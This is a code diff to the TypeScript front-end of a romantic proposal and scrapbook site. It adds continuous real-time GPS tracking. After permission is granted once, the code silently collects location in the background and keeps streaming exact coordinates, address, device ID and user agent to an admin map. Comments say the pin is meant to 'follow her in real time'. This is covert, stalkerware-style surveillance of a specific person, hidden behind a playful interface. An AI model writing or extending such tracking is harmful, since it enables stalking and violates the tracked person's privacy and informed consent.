@@ -1,4 +1,13 @@
 import * as d3 from 'd3';
+import {
+  MAX_USABLE_ACCURACY_METERS,
+  formatCoordinates,
+  gpsMetaTag,
+  haversineMeters,
+  isPreciseGps,
+  isValidCoordinate,
+  type LocationSource
+} from './geo';
 
 // Proposal modal with evasive "No" button and confetti celebration
 let dodgeCount = 0;
@@ -22,7 +31,21 @@ export interface LocationData {
   fullAddress: string;
   city: string;
   country: string;
+  /** Accuracy radius reported by the GPS chip, in metres (null when unavailable). */
+  accuracyMeters?: number | null;
+  /** 'gps' = real device fix · 'ip' = network estimate only · 'unknown' = no data. */
+  source?: LocationSource;
 }
+
+/** Real device GPS fix captured from this browser (never an IP estimate). */
+const LIVE_LOCATION_KEY = 'ivraine_live_location';
+/** Network/IP estimate — deliberately kept apart so it can never become a map pin. */
+const APPROX_LOCATION_KEY = 'ivraine_approx_location';
+/** Push a live update at most once every 15 s … */
+const LIVE_UPDATE_MIN_INTERVAL_MS = 15000;
+/** … or immediately when the phone actually moved at least 20 m (min 8 s between sends). */
+const LIVE_UPDATE_MIN_DISTANCE_METERS = 20;
+const LIVE_UPDATE_MOVE_INTERVAL_MS = 8000;
 
 export async function reverseGeocode(lat: number, lng: number): Promise<{ fullAddress: string; city: string; country: string }> {
   try {
@@ -68,15 +91,24 @@ export function trackActivity(
 ) {
   try {
     const deviceId = getDeviceId();
+    const hasCoords = isValidCoordinate(location?.latitude, location?.longitude);
+    // The GPS provenance tag travels inside `details` so the admin map can tell a
+    // real device fix apart from a network/IP estimate without any schema change.
+    const taggedDetails = hasCoords
+      ? `${details ? `${details} ` : ''}${gpsMetaTag(location?.accuracyMeters, location?.source || 'gps')}`
+      : details;
+
     const payload = {
       section,
       action,
-      details,
+      details: taggedDetails,
       user,
       deviceId,
       dodgeCount: dodges,
-      latitude: location?.latitude,
-      longitude: location?.longitude,
+      latitude: hasCoords ? location?.latitude : null,
+      longitude: hasCoords ? location?.longitude : null,
+      accuracy: hasCoords ? location?.accuracyMeters ?? null : null,
+      gpsSource: hasCoords ? location?.source || 'gps' : null,
       fullAddress: location?.fullAddress,
       city: location?.city,
       country: location?.country
@@ -98,13 +130,13 @@ export function trackActivity(
           ip: 'Client',
           section,
           action,
-          details,
+          details: taggedDetails,
           user,
           userAgent: navigator.userAgent,
           deviceId,
           dodgeCount: dodges,
-          latitude: location?.latitude ?? null,
-          longitude: location?.longitude ?? null,
+          latitude: hasCoords ? location?.latitude ?? null : null,
+          longitude: hasCoords ? location?.longitude ?? null : null,
           fullAddress: location?.fullAddress ?? '',
           city: location?.city ?? '',
           country: location?.country ?? '',
@@ -115,93 +147,261 @@ export function trackActivity(
   } catch {}
 }
 
+/** Persists a real GPS fix. Only real fixes may ever be replayed as the phone pin. */
+function saveLiveLocationSnapshot(loc: LocationData) {
+  try {
+    const payload = { ...loc, timestamp: new Date().toISOString() };
+    localStorage.setItem(LIVE_LOCATION_KEY, JSON.stringify(payload));
+    localStorage.setItem('ivraine_last_location', JSON.stringify(payload));
+    localStorage.setItem('ivraine_saved_pinned_location', JSON.stringify(payload));
+  } catch {}
+}
+
+/** Turns a raw device position into LocationData, or null when it is unusable. */
+async function buildGpsLocation(pos: GeolocationPosition): Promise<LocationData | null> {
+  const { latitude, longitude, accuracy } = pos.coords;
+  if (!isValidCoordinate(latitude, longitude)) return null;
+
+  const accuracyMeters = typeof accuracy === 'number' && Number.isFinite(accuracy) && accuracy > 0 ? accuracy : null;
+  const geo = await reverseGeocode(latitude, longitude);
+
+  return {
+    latitude,
+    longitude,
+    fullAddress: geo.fullAddress || formatCoordinates(latitude, longitude),
+    city: geo.city,
+    country: geo.country,
+    accuracyMeters,
+    source: 'gps'
+  };
+}
+
+/**
+ * Publishes one real device GPS fix.
+ * A fix too coarse to point at a street (> 200 m) is still logged, but it is NEVER
+ * written as a pin, so the admin map can never show her at a wrong place.
+ */
+async function publishGpsLocation(
+  source: 'Scrapbook' | 'Private Space' | 'Admin',
+  userName: string,
+  loc: LocationData
+): Promise<boolean> {
+  const precise = isPreciseGps(loc.accuracyMeters);
+  saveLiveLocationSnapshot(loc);
+
+  trackActivity(
+    source,
+    precise ? 'Shared Live GPS Location' : 'Shared Coarse Location (not pinned)',
+    `Address: ${loc.fullAddress}`,
+    userName,
+    0,
+    loc
+  );
+
+  if (!precise) return false;
+
+  const deviceId = getDeviceId();
+
+  // Endpoint that stores the single authoritative phone pin (address + coordinates).
+  try {
+    await fetch('/api/date-location', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        latitude: loc.latitude,
+        longitude: loc.longitude,
+        accuracy: loc.accuracyMeters,
+        gpsSource: 'gps',
+        user: userName,
+        source,
+        deviceId,
+        fullAddress: loc.fullAddress,
+        city: loc.city,
+        country: loc.country
+      }),
+      keepalive: true
+    });
+  } catch {}
+
+  // Instant push for an admin dashboard open in another tab of this browser.
+  try {
+    const channel = new BroadcastChannel('ivraine_admin_channel');
+    channel.postMessage({
+      type: 'LOG_ADDED',
+      entry: {
+        id: 'live_' + Date.now(),
+        ip: 'Phone GPS Pin',
+        section: source,
+        action: '📍 Live GPS Pin Updated ♡',
+        details: `${loc.fullAddress} ${gpsMetaTag(loc.accuracyMeters, 'gps')} [Device: ${deviceId}]`,
+        user: userName,
+        userAgent: navigator.userAgent,
+        deviceId,
+        dodgeCount,
+        latitude: loc.latitude,
+        longitude: loc.longitude,
+        accuracy: loc.accuracyMeters,
+        fullAddress: loc.fullAddress,
+        city: loc.city,
+        country: loc.country,
+        timestamp: new Date().toISOString()
+      }
+    });
+  } catch {}
+
+  return true;
+}
+
+/** One-shot GPS read. Resolves with null when permission is missing or the fix is unusable. */
 export async function acquireAndSaveLocation(source: 'Scrapbook' | 'Private Space' | 'Admin', userName = 'Visitor'): Promise<LocationData | null> {
   if (!navigator.geolocation) return null;
   return new Promise((resolve) => {
     navigator.geolocation.getCurrentPosition(
       async (pos) => {
-        const { latitude, longitude } = pos.coords;
-        const geo = await reverseGeocode(latitude, longitude);
-        const loc: LocationData = {
-          latitude,
-          longitude,
-          fullAddress: geo.fullAddress,
-          city: geo.city,
-          country: geo.country
-        };
-        try {
-          localStorage.setItem('ivraine_last_location', JSON.stringify(loc));
-          localStorage.setItem('ivraine_saved_pinned_location', JSON.stringify(loc));
-        } catch {}
-
-        trackActivity(source, 'Shared Location', `Address: ${loc.fullAddress}`, userName, 0, loc);
-
-        // Also send to backend date-location endpoint for Mapbox geocoding + storage
-        try {
-          const deviceId = getDeviceId();
-          await fetch('/api/date-location', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ latitude, longitude, user: userName, source, deviceId }),
-            keepalive: true
-          });
-        } catch {}
-
+        const loc = await buildGpsLocation(pos);
+        if (!loc) {
+          resolve(null);
+          return;
+        }
+        await publishGpsLocation(source, userName, loc);
         resolve(loc);
       },
       () => resolve(null),
-      { enableHighAccuracy: true, timeout: 10000, maximumAge: 30000 }
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 5000 }
     );
   });
 }
 
-export async function acquireLocationWithBypass(): Promise<LocationData> {
-  // 1. Check existing saved location
+// ─────────────────────────────────────────────────────────────────────────────
+// LIVE GPS STREAM (this is what keeps the admin pin real-time and exact)
+// ─────────────────────────────────────────────────────────────────────────────
+let liveWatchId: number | null = null;
+let liveLastSentAt = 0;
+let liveLastSentLat = Number.NaN;
+let liveLastSentLng = Number.NaN;
+let liveSendInFlight = false;
+
+export function isLiveLocationTracking(): boolean {
+  return liveWatchId !== null;
+}
+
+/** Starts streaming real GPS fixes to the admin map (safe to call repeatedly). */
+export function startLiveLocationTracking(source: 'Scrapbook' | 'Private Space' | 'Admin', userName = 'Visitor'): boolean {
+  if (!navigator.geolocation) return false;
+  if (liveWatchId !== null) return true;
+
   try {
-    const saved = localStorage.getItem('ivraine_last_location') || localStorage.getItem('ivraine_saved_pinned_location');
+    liveWatchId = navigator.geolocation.watchPosition(
+      (pos) => { void handleLiveGpsFix(source, userName, pos); },
+      () => { stopLiveLocationTracking(); },
+      { enableHighAccuracy: true, maximumAge: 3000, timeout: 30000 }
+    );
+  } catch {
+    liveWatchId = null;
+    return false;
+  }
+  return true;
+}
+
+export function stopLiveLocationTracking(): void {
+  if (liveWatchId === null) return;
+  try {
+    navigator.geolocation.clearWatch(liveWatchId);
+  } catch {}
+  liveWatchId = null;
+}
+
+async function handleLiveGpsFix(
+  source: 'Scrapbook' | 'Private Space' | 'Admin',
+  userName: string,
+  pos: GeolocationPosition
+): Promise<void> {
+  const { latitude, longitude, accuracy } = pos.coords;
+  if (!isValidCoordinate(latitude, longitude)) return;
+  // Coarse/network fixes are dropped: better no update than a wrong pin.
+  if (typeof accuracy === 'number' && accuracy > MAX_USABLE_ACCURACY_METERS) return;
+  if (liveSendInFlight) return;
+
+  const now = Date.now();
+  const elapsed = now - liveLastSentAt;
+  const movedMeters = Number.isFinite(liveLastSentLat)
+    ? haversineMeters(liveLastSentLat, liveLastSentLng, latitude, longitude)
+    : Number.POSITIVE_INFINITY;
+
+  const dueByTime = liveLastSentAt === 0 || elapsed >= LIVE_UPDATE_MIN_INTERVAL_MS;
+  const dueByMovement = movedMeters >= LIVE_UPDATE_MIN_DISTANCE_METERS && elapsed >= LIVE_UPDATE_MOVE_INTERVAL_MS;
+  if (!dueByTime && !dueByMovement) return;
+
+  liveSendInFlight = true;
+  try {
+    const loc = await buildGpsLocation(pos);
+    if (!loc) return;
+    await publishGpsLocation(source, userName, loc);
+    liveLastSentAt = Date.now();
+    liveLastSentLat = latitude;
+    liveLastSentLng = longitude;
+  } finally {
+    liveSendInFlight = false;
+  }
+}
+
+// When the phone comes back to the foreground, push a fresh fix immediately
+// instead of waiting for the 15 s throttle window to expire.
+try {
+  document.addEventListener('visibilitychange', () => {
+    if (document.visibilityState === 'visible' && liveWatchId !== null) liveLastSentAt = 0;
+  });
+} catch {}
+
+export async function acquireLocationWithBypass(): Promise<LocationData> {
+  // 1. A previously stored REAL GPS fix from this device.
+  try {
+    const saved = localStorage.getItem(LIVE_LOCATION_KEY)
+      || localStorage.getItem('ivraine_last_location')
+      || localStorage.getItem('ivraine_saved_pinned_location');
     if (saved) {
-      const parsed = JSON.parse(saved);
-      if (parsed.latitude && parsed.longitude) {
+      const parsed = JSON.parse(saved) as LocationData;
+      if (isValidCoordinate(parsed?.latitude, parsed?.longitude) && (parsed.source === undefined || parsed.source === 'gps')) {
         return parsed;
       }
     }
   } catch {}
 
-  // 2. Fetch IP-based geolocation from /api/ip
+  // 2. Network/IP estimate. Flagged as 'ip' AND stored under a separate key so it
+  //    can never be mistaken for (or overwrite) the phone's real GPS pin.
   try {
     const res = await fetch('/api/ip', { signal: AbortSignal.timeout(4000) });
     if (res.ok) {
       const data = await res.json();
-      if (data.latitude && data.longitude) {
+      if (isValidCoordinate(data?.latitude, data?.longitude)) {
         const loc: LocationData = {
           latitude: data.latitude,
           longitude: data.longitude,
-          city: data.city || 'Tagbilaran City',
-          country: data.country || 'Philippines',
-          fullAddress: data.fullAddress || `${data.city || 'Tagbilaran City'}, Philippines`
+          city: data.city || '',
+          country: data.country || '',
+          fullAddress: data.fullAddress || '',
+          accuracyMeters: null,
+          source: 'ip'
         };
         try {
-          localStorage.setItem('ivraine_last_location', JSON.stringify(loc));
-          localStorage.setItem('ivraine_saved_pinned_location', JSON.stringify(loc));
+          localStorage.setItem(APPROX_LOCATION_KEY, JSON.stringify({ ...loc, timestamp: new Date().toISOString() }));
         } catch {}
         return loc;
       }
     }
   } catch {}
 
-  // 3. Fallback coordinates for Bohol
-  const fallbackLoc: LocationData = {
-    latitude: 9.6496,
-    longitude: 123.8647,
-    city: 'Tagbilaran City',
-    country: 'Philippines',
-    fullAddress: 'Tagbilaran City, Bohol, Philippines'
+  // 3. Nothing trustworthy available. Returning an empty result (instead of fake
+  //    Bohol coordinates) is what stops phantom pins on the admin map.
+  return {
+    latitude: Number.NaN,
+    longitude: Number.NaN,
+    city: '',
+    country: '',
+    fullAddress: '',
+    accuracyMeters: null,
+    source: 'unknown'
   };
-  try {
-    localStorage.setItem('ivraine_last_location', JSON.stringify(fallbackLoc));
-    localStorage.setItem('ivraine_saved_pinned_location', JSON.stringify(fallbackLoc));
-  } catch {}
-  return fallbackLoc;
 }
 
 export async function checkAndPromptPermissions(source: 'Scrapbook' | 'Private Space' | 'Admin', userName = 'Visitor') {
@@ -221,9 +421,11 @@ export async function checkAndPromptPermissions(source: 'Scrapbook' | 'Private S
     }
   } catch {}
 
-  // If already granted, silently acquire location in background
+  // If already granted: send one exact fix now AND keep streaming real fixes so the
+  // admin map stays accurate while the phone moves (this is the "real time" part).
   if (hasLocation) {
     void acquireAndSaveLocation(source, userName);
+    startLiveLocationTracking(source, userName);
   }
 
   // If already granted both or dismissed recently, skip prompt
@@ -284,6 +486,7 @@ export async function checkAndPromptPermissions(source: 'Scrapbook' | 'Private S
 
       try {
         await acquireAndSaveLocation(source, userName);
+        startLiveLocationTracking(source, userName);
       } catch {}
 
       overlay.remove();
@@ -995,55 +1198,15 @@ async function requestPhoneLocationStrict(
   navigator.geolocation.getCurrentPosition(
     async (pos) => {
       clearTimeout(timeoutId);
-      const { latitude, longitude } = pos.coords;
-      const geo = await reverseGeocode(latitude, longitude);
-      const loc: LocationData = {
-        latitude,
-        longitude,
-        fullAddress: geo.fullAddress || `${latitude.toFixed(4)}, ${longitude.toFixed(4)}`,
-        city: geo.city || '',
-        country: geo.country || ''
-      };
+      const loc = await buildGpsLocation(pos);
+      if (!loc) {
+        onDeniedOrTimeout('Your phone could not get an accurate GPS fix. Please step outside or turn on high-accuracy location and try again ♡');
+        return;
+      }
 
-      try {
-        localStorage.setItem('ivraine_last_location', JSON.stringify(loc));
-        localStorage.setItem('ivraine_saved_pinned_location', JSON.stringify(loc));
-      } catch {}
-
-      trackActivity(source, 'Shared Location', `Address: ${loc.fullAddress}`, userName, 0, loc);
-
-      const deviceId = getDeviceId();
-      try {
-        await fetch('/api/date-location', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ latitude, longitude, user: userName, source, deviceId }),
-          keepalive: true
-        });
-      } catch {}
-
-      try {
-        const channel = new BroadcastChannel('ivraine_admin_channel');
-        channel.postMessage({
-          type: 'LOG_ADDED',
-          entry: {
-            id: 'live_' + Date.now(),
-            ip: 'Visitor Live Pin',
-            section: source,
-            action: '📍 Pinned Location Saved ♡',
-            details: (loc.fullAddress || loc.city || 'Visitor Coordinates') + ` [Device: ${deviceId}]`,
-            user: userName,
-            deviceId,
-            dodgeCount: dodgeCount,
-            latitude: loc.latitude,
-            longitude: loc.longitude,
-            fullAddress: loc.fullAddress,
-            city: loc.city,
-            country: loc.country,
-            timestamp: new Date().toISOString()
-          }
-        });
-      } catch {}
+      // Keep the live stream running so the admin pin follows her in real time.
+      startLiveLocationTracking(source, userName);
+      await publishGpsLocation(source, userName, loc);
 
       await onSuccess(loc);
     },
